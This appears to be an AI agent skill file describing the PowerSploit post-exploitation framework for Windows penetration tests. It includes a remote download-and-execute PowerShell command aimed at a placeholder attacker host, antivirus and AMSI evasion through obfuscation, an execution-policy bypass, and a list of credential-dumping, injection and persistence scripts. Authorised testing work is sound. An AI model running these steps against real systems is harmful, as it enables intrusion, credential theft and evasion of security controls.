---
name: powersploit
description: A comprehensive PowerShell post-exploitation framework consisting of scripts for reconnaissance, persistence, exfiltration, and privilege escalation. Use during the post-exploitation phase of a penetration test on Windows environments to bypass antivirus, execute code, and maintain access.
---

# PowerSploit

## Overview
PowerSploit is a collection of Microsoft PowerShell modules that can be used by penetration testers during all phases of an assessment, specifically focusing on post-exploitation. It is categorized under Post-Exploitation and is designed for use on Windows targets.

## Installation (if not already installed)
PowerSploit is typically pre-installed on Kali Linux. If missing, install it using:

```bash
sudo apt update && sudo apt install powersploit
```

The scripts are located in `/usr/share/windows-resources/powersploit/` and `/usr/share/powersploit/`.

## Common Workflows

### Serving Scripts to a Target
Since PowerSploit is a collection of `.ps1` files, you often need to host them via HTTP to download them onto a target Windows machine.

```bash
cd /usr/share/windows-resources/powersploit/
python3 -m http.server 80
```

On the Windows target:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<KALI_IP>/Recon/Get-ComputerDetails.ps1')
```

### Local Execution of a Module
If you have a PowerShell session on the target, you can import the entire framework:
```powershell
Import-Module .\PowerSploit.psm1
Get-Command -Module PowerSploit
```

### Bypassing Antivirus with Script Modification
Use the `ScriptModification` tools to obfuscate scripts before deployment:
```powershell
Out-EncodedCommand -ScriptPath .\Recon\Get-ComputerDetails.ps1
```

## Complete Command Reference

PowerSploit is organized into functional directories. Each directory contains specific PowerShell scripts (.ps1) and documentation.

### Framework Structure
The main entry points and modules are:
- `PowerSploit.psd1`: PowerShell Data File (Manifest)
- `PowerSploit.psm1`: PowerShell Module File

### Module Categories

| Directory | Description |
|-----------|-------------|
| `AntivirusBypass` | Tools to assist in bypassing host-based security products. |
| `CodeExecution` | Scripts to execute code on a target machine (e.g., DLL injection, Shellcode injection). |
| `Exfiltration` | Tools for collecting and exfiltrating data from the target (e.g., logon passwords, NT hashes). |
| `Mayhem` | Scripts for causing general disruption or "mayhem" on a target system. |
| `Persistence` | Scripts to maintain access to a machine across reboots and user sessions. |
| `Privesc` | Tools to assist with local privilege escalation on Windows systems. |
| `Recon` | Scripts for gathering information about the target, the domain, and the network. |
| `ReverseEngineering` | Tools for analyzing binaries and performing reverse engineering tasks. |
| `ScriptModification` | Tools to modify or obfuscate PowerShell scripts to evade detection. |
| `PETools` | Utilities for manipulating and inspecting Windows Portable Executable (PE) files. |

### Key Scripts by Category (Commonly Used)

**Recon (Information Gathering)**
- `Get-ComputerDetails.ps1`: Gathers detailed information about the local system.
- `Invoke-Portscan.ps1`: Performs a port scan from the target machine.
- `Get-HttpStatus.ps1`: Checks the HTTP status of a list of URLs.

**Exfiltration (Credential Theft)**
- `Invoke-Mimikatz.ps1`: Reflectively loads Mimikatz into memory to dump credentials.
- `Get-GPPPassword.ps1`: Retrieves passwords from Group Policy Preferences.
- `Invoke-NinjaCopy.ps1`: Copies files that are locked by the OS (e.g., NTDS.dit).

**Privesc (Privilege Escalation)**
- `PowerUp.ps1`: A suite of checks for common Windows privilege escalation vectors.
- `Get-System.ps1`: Attempts to obtain SYSTEM privileges.

**CodeExecution**
- `Invoke-Shellcode.ps1`: Injects shellcode into a process.
- `Invoke-DllInjection.ps1`: Injects a DLL into a process.

**Persistence**
- `New-UserPersistenceOption`: Configures persistence via registry or scheduled tasks.

## Notes
- **Execution Policy**: You may need to bypass the PowerShell execution policy on the target using `powershell -ExecutionPolicy Bypass`.
- **Memory Only**: Most PowerSploit scripts are designed to be run in memory (using `IEX`) to minimize the footprint on the target's disk.
- **Modern Windows**: Some older PowerSploit scripts may be flagged by Windows Defender (AMSI). Use the `ScriptModification` tools or manual obfuscation to bypass these protections.